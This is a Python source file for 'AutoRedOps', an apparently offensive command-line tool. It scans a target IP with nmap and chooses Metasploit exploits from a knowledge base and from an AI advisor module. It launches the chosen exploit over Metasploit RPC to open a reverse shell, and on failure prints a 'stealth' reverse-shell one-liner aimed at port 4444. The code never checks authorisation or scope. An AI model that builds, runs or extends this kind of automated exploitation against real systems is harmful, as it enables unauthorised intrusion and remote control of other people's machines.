import yaml
import sys
import subprocess
import socket
import time
import os

# Import your modules
try:
    from scanner_nmap import NmapScanner
    from msf_rpc import MetasploitRPC
    from reporter import Reporter
    from ai_brain import AIBrain
    from payload_manager import PayloadManager
except ImportError as e:
    print(f"[-] Critical Error: Missing module: {e}")
    sys.exit(1)

# ANSI Colors for Terminal UI
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class AutoRedOpsCLI:
    def __init__(self):
        self.clear_screen()
        print(f"{Colors.HEADER}{Colors.BOLD}=== AutoRedOps: Linux CLI Edition ==={Colors.ENDC}")
        
        # 1. Load Config
        try:
            with open('config.yaml', 'r') as f:
                self.config = yaml.safe_load(f)
            with open('knowledge_base.yml', 'r') as f:
                self.kb = yaml.safe_load(f)
        except FileNotFoundError:
            print(f"{Colors.FAIL}[-] Error: Configuration files missing.{Colors.ENDC}")
            sys.exit(1)

        # 2. Initialize Components
        print(f"{Colors.BLUE}[*] Initializing components...{Colors.ENDC}")
        self.scanner = NmapScanner()
        self.ai = AIBrain()
        self.payload_gen = PayloadManager()
        self.reporter = Reporter(self.config)
        
        # 3. Connect to Metasploit
        self.start_msf_rpc()
        try:
            self.rpc = MetasploitRPC()
            self.rpc_available = True
            print(f"{Colors.GREEN}[+] Metasploit RPC Connected!{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.WARNING}[!] Metasploit connection failed: {e}{Colors.ENDC}")
            print(f"{Colors.WARNING}[!] Exploitation mode disabled.{Colors.ENDC}")
            self.rpc_available = False

    def clear_screen(self):
        os.system('clear')

    def start_msf_rpc(self):
        """Auto-starts MSF RPC if on Linux"""
        rpc_port = self.config['metasploit']['port']
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if sock.connect_ex(('127.0.0.1', rpc_port)) == 0:
            return # Already running
        
        print(f"{Colors.BLUE}[*] Starting msfrpcd daemon...{Colors.ENDC}")
        # Linux specific command
        cmd = f"msfrpcd -P {self.config['metasploit']['password']} -n -S -a 127.0.0.1 -p {rpc_port}"
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(10) # Give it time to boot

    def run(self):
        while True:
            print(f"\n{Colors.BOLD}--- MAIN MENU ---{Colors.ENDC}")
            target = input(f"{Colors.BLUE}[?] Enter Target IP (or 'exit'): {Colors.ENDC}").strip()
            
            if target.lower() == 'exit':
                print("Exiting...")
                sys.exit(0)
                
            if not target:
                print(f"{Colors.FAIL}[!] Target required.{Colors.ENDC}")
                continue

            # PHASE 1: SCAN
            print(f"\n{Colors.BLUE}[*] Scanning {target}... (This may take a minute){Colors.ENDC}")
            scan_data = self.scanner.scan_target(target)
            
            # Show Findings
            print(f"\n{Colors.GREEN}[+] Scan Complete! Open Ports:{Colors.ENDC}")
            for p in scan_data['ports']:
                print(f"    - {p['port']}/{p['service']} : {p['product']}")

            # PHASE 2: PLAN
            attacks = self.plan_attacks(scan_data)
            
            # PHASE 3: ATTACK
            if attacks:
                self.handle_exploitation(attacks, target)
            else:
                print(f"{Colors.WARNING}[-] No immediate attack vectors found.{Colors.ENDC}")

            # PHASE 4: REPORT
            self.reporter.generate_report(scan_data, None)

    def plan_attacks(self, scan_results):
        attacks = []
        print(f"\n{Colors.BLUE}[*] Consulting Knowledge Base & AI...{Colors.ENDC}")
        
        for p in scan_results['ports']:
            # Static Check
            for exploit in self.kb['exploit_mappings']:
                if exploit.get('target_port') == int(p['port']):
                    attacks.append({
                        'name': exploit['description'],
                        'module': exploit['msf_module'],
                        'payload': exploit['payload'],
                        'port': p['port'],
                        'type': 'Static'
                    })
            
            # AI Check
            if self.ai.client:
                print(f"    > AI Analyzing Port {p['port']}...")
                advice = self.ai.analyze_vulnerability(p['service'], p['port'], p['cves'])
                if advice:
                    attacks.append({
                        'name': f"AI Advice: {advice[:60]}...",
                        'module': 'Manual',
                        'port': p['port'],
                        'type': 'AI'
                    })
        return attacks

    def handle_exploitation(self, attacks, target):
        print(f"\n{Colors.BOLD}--- ATTACK VECTORS ---{Colors.ENDC}")
        for i, atk in enumerate(attacks):
            print(f"[{i+1}] [{atk['type']}] {atk['name']}")
            
        try:
            choice = int(input(f"\n{Colors.FAIL}[?] Select exploit ID to launch (0 to skip): {Colors.ENDC}"))
            if choice == 0: return
            
            selected = attacks[choice-1]
            
            if selected['type'] == 'AI' or selected['module'] == 'Manual':
                print(f"{Colors.WARNING}[!] This is a manual/AI vector. Follow the advice above.{Colors.ENDC}")
            elif self.rpc_available:
                lhost = input(f"{Colors.BLUE}[?] Enter LHOST (Your VPN/LAN IP): {Colors.ENDC}")
                
                print(f"{Colors.FAIL}[*] Launching {selected['module']}...{Colors.ENDC}")
                result = self.rpc.execute_exploit({
                    'msf_module': selected['module'],
                    'payload': selected['payload'],
                    'target_port': int(selected['port'])
                }, target, lhost)
                
                if result['success']:
                    print(f"{Colors.GREEN}[!!!] SHELL OPENED! Session ID: {result['session_id']}{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[-] Exploit failed.{Colors.ENDC}")
                    
                    # Stealth Fallback
                    print(f"\n{Colors.WARNING}[?] Attempting Stealth Payload Generator...{Colors.ENDC}")
                    cmd = self.payload_gen.get_random_oneliner(lhost, 4444)
                    print(f"    Try this manually: {cmd}")
                    
        except ValueError:
            pass

if __name__ == "__main__":
    app = AutoRedOpsCLI()
    app.run()